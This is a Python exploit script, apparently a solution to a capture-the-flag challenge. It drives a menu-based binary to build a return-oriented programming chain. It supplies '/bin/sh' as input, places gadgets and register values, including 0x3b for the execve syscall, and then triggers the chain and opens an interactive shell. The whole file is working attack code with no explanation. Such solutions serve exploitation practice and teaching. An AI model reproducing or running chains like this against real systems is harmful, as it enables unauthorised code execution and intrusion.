import interact 

p = interact.Process()

p.readuntil('[*] Enter your name')
p.sendline('/bin/sh\x00')


p.readuntil("Choice:")
p.sendline("1")
p.readuntil("6. Add Gadget: { ret }")
p.sendline("1")
p.readuntil("What index should the gadget be placed at?")
p.sendline("88")
p.readuntil("Choice:")
p.sendline("3")
p.readuntil("[*] Enter Index:")
p.sendline("96")
p.readuntil("[*] Enter Number (In Hex):")
p.sendline("0x603100")


p.readuntil("Choice:")
p.sendline("1")
p.readuntil("6. Add Gadget: { ret }")
p.sendline("2")
p.readuntil("What index should the gadget be placed at?")
p.sendline("104")
p.readuntil("Choice:")
p.sendline("3")
p.readuntil("[*] Enter Index:")
p.sendline("112")
p.readuntil("[*] Enter Number (In Hex):")
p.sendline("0x0")

p.readuntil("Choice:")
p.sendline("1")
p.readuntil("6. Add Gadget: { ret }")
p.sendline("3")
p.readuntil("What index should the gadget be placed at?")
p.sendline("120")
p.readuntil("Choice:")
p.sendline("3")
p.readuntil("[*] Enter Index:")
p.sendline("128")
p.readuntil("[*] Enter Number (In Hex):")
p.sendline("0x0")


p.readuntil("Choice:")
p.sendline("1")
p.readuntil("6. Add Gadget: { ret }")
p.sendline("4")
p.readuntil("What index should the gadget be placed at?")
p.sendline("136")
p.readuntil("Choice:")
p.sendline("3")
p.readuntil("[*] Enter Index:")
p.sendline("144")
p.readuntil("[*] Enter Number (In Hex):")
p.sendline("0x3b")


p.readuntil("Choice:")
p.sendline("1")
p.readuntil("6. Add Gadget: { ret }")
p.sendline("5")
p.readuntil("What index should the gadget be placed at?")
p.sendline("152")



p.readuntil("Choice:")
p.sendline("5")


p.interactive()